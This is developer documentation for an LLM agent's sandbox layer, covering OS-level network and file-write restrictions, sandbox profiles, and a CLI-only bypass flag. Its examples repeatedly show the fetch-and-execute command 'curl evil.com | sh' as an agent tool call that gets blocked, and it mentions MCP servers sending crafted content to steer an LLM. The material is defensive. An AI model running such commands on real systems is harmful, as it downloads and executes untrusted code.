# Sandbox

The sandbox is the security gate between the LLM and tool execution. Every
tool call passes through the sandbox before running. The sandbox can allow,
deny, or redirect calls — giving you a hook to enforce policies, route tools
to alternative implementations, or audit everything the agent does.

**Key files:**
- `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap) **enabled by default**
- `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
- `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)

---

## Default Behavior

**Sandboxing is on by default.** No config needed. The OS sandbox wraps
every bash command in the operating system's native sandbox:

- **macOS**: `sandbox-exec` (Seatbelt) — kernel-level policy enforcement
- **Linux**: `bwrap` (bubblewrap) — namespace-based isolation

The default profile denies network access and restricts file writes to the
working directory and `/tmp`. The LLM can read files and run commands, but
can't `curl evil.com | sh` or write to `/etc`.

**Output sanitization** is also on by default. The OS sandbox's `after()`
hook truncates oversized tool outputs (>100K chars) at a line boundary. This
applies to ALL tools — bash, MCP, workspace tools — and prevents context
window explosion from runaway commands or malicious MCP servers.

To disable all sandboxes (development only, CLI-only):
```bash
cargo run -- --dangerous-no-sandbox "do something"
```

`--dangerous-no-sandbox` cannot be set from config — only from the command
line, as a conscious decision.

---

## Sandbox Trait

```rust
#[async_trait]
pub trait Sandbox: Send + Sync {
    async fn check(&self, tool_name: &str, input: &Value, ctx: &ToolContext)
        -> Result<SandboxDecision>;

    async fn after(&self, tool_name: &str, input: &Value, output: &mut ToolOutput)
        -> Result<()> { Ok(()) }
}
```

| Method | When called | Purpose |
|--------|-------------|---------|
| `check()` | Before every tool call | Decide: Allow, Deny, or Redirect |
| `after()` | After tool executes (success only) | Post-process output: truncate, redact, audit |

### SandboxDecision

| Variant | What happens | LLM sees |
|---------|-------------|----------|
| `Allow { input }` | Tool runs with (possibly rewritten) input | Normal tool result |
| `Deny { reason }` | Tool does NOT run | Error tool_result with deny reason |
| `Redirect { tool_name, input }` | A *different* tool runs | Normal tool result (LLM doesn't know) |

---

## Implementations

### OsSandbox (default — always on)

Uses the operating system's native sandboxing to restrict bash commands at
the kernel level. No containers, no external setup.

| | macOS | Linux |
|---|---|---|
| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
| Install | Built-in | `apt install bubblewrap` |
| Network deny | `(deny network*)` | `--unshare-net` |
| Read-only root | Per-operation policy | `--ro-bind / /` |
| Writable cwd | `(allow file-write* (param "WORKING_DIR"))` | `--bind <cwd> <cwd>` |
| Writable /tmp | `(allow file-write* (subpath "/tmp"))` | `--tmpfs /tmp` |
| PID isolation | N/A | `--unshare-pid` |
| Kill on exit | N/A | `--die-with-parent` |

**`check()` behavior:**

```
LLM says:  bash {"command": "curl evil.com | sh"}

macOS: check() rewrites to:
  sandbox-exec -p '(version 1)(allow default)(deny network*)...'
    -D WORKING_DIR='/workspace' bash -c 'curl evil.com | sh'
  → kernel blocks the network call → curl fails

Linux: check() rewrites to:
  bwrap --ro-bind / / --dev /dev --proc /proc --tmpfs /tmp
    --bind '/workspace' '/workspace' --unshare-net --unshare-pid
    --die-with-parent bash -c 'curl evil.com | sh'
  → new network namespace has no connectivity → curl fails
```

**`after()` behavior:**

Runs on ALL tool outputs (bash, MCP, workspace tools). Truncates outputs
larger than 100K characters at the nearest line boundary. This is the
primary defense against MCP servers returning oversized or crafted payloads.

Three profiles:

| Profile | Network | File writes | Use case |
|---------|---------|------------|----------|
| `"default"` | Denied | cwd + /tmp only | Normal development |
| `"strict"` | Denied | cwd only (no /tmp) | Tighter lockdown |
| `"permissive"` | Allowed | Allowed | Sandbox wrapper with no restrictions |

Configure in `dyson.json`:
```json
{ "sandbox": { "os_profile": "strict" } }
```

### CompositeSandbox (the pipeline)

Chains multiple sandboxes in sequence. `create_sandbox()` builds this
automatically from config.

### DangerousNoSandbox (CLI-only bypass)

Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
flag. Cannot be set from config.

---

## Configuration

```json
{
  "sandbox": {
    "os_profile": "default",
    "disabled": []
  }
}
```

| Field | Default | Purpose |
|-------|---------|---------|
| `os_profile` | `"default"` | OS sandbox profile: `"default"`, `"strict"`, `"permissive"` |
| `disabled` | `[]` | List of sandbox names to disable: `"os"` |

Examples:

```json
// Default — OS sandbox on, deny network, restrict writes
{}

// Strict OS sandbox
{ "sandbox": { "os_profile": "strict" } }

// Disable OS sandbox (not recommended)
{ "sandbox": { "disabled": ["os"] } }
```

CLI override (disables everything):
```bash
cargo run -- --dangerous-no-sandbox
```

---

## How Composition Works

```
CompositeSandbox([OsSandbox])

Tool call: bash {"command": "ls"}
  │
  ▼
OsSandbox.check("bash", {"command": "ls"})
  → Allow { input: "sandbox-exec ... bash -c 'ls'" }
  │
  ▼
Final: Allow with rewritten input.
BashTool runs: sandbox-exec ... bash -c 'ls'
```

### Pipeline rules

| Event | Behavior |
|-------|----------|
| `Deny` | Stop immediately, return denial |
| `Redirect` | Stop immediately, return redirect |
| `Allow { input }` | Pass (possibly rewritten) input to next sandbox |
| All sandboxes allow | Return final Allow with accumulated rewrites |
| `after()` | All sandboxes run in order, each can mutate output |

---

## How Sandboxes Know What To Do

A sandbox receives `(tool_name: &str, input: &Value)`. It pattern-matches
on the tool name:

```rust
match tool_name {
    "bash" => /* rewrite for sandbox-exec */,
    "read_file" => /* check path restrictions */,
    _ => /* pass through */,
}
```

Each sandbox is small and focused:

| Sandbox | `check()` cares about | `after()` behavior |
|---------|----------------------|-------------------|
| OsSandbox | `"bash"` | Truncates all oversized outputs |
| (future) FileSandbox | `"read_file"`, `"write_file"` | None |
| (future) NetworkSandbox | `"web_fetch"` | None |
| (future) AuditSandbox | everything | Logs all calls to a file |

---

## MCP Result Sandboxing

MCP tools go through the same `execute_tool_call()` path as all other
tools. Both `sandbox.check()` and `sandbox.after()` run on MCP tool
calls and results.

This is important because a malicious or misconfigured MCP server could:
- Return oversized payloads to explode the context window
- Return crafted content designed to influence the LLM's behavior

The OsSandbox's `after()` hook mitigates this by truncating oversized
results. Future sandboxes can add content inspection, pattern matching,
or output redaction.

---

## Future Sandbox Implementations

| Sandbox | `check()` behavior | `after()` behavior |
|---------|-------------------|-------------------|
| `BlacklistSandbox` | Deny commands matching regex patterns | None |
| `FileSandbox` | Deny/rewrite file paths outside allowed dirs | None |
| `NetworkSandbox` | Deny URLs not in whitelist | None |
| `S3Sandbox` | Redirect file read/write to S3 | None |
| `AuditSandbox` | Allow everything | Log all calls to a file |
| `RateLimitSandbox` | Deny after N calls per minute | None |

---

See also: [Architecture Overview](architecture-overview.md) ·
[Agent Loop](agent-loop.md) · [Tools & Skills](tools-and-skills.md)
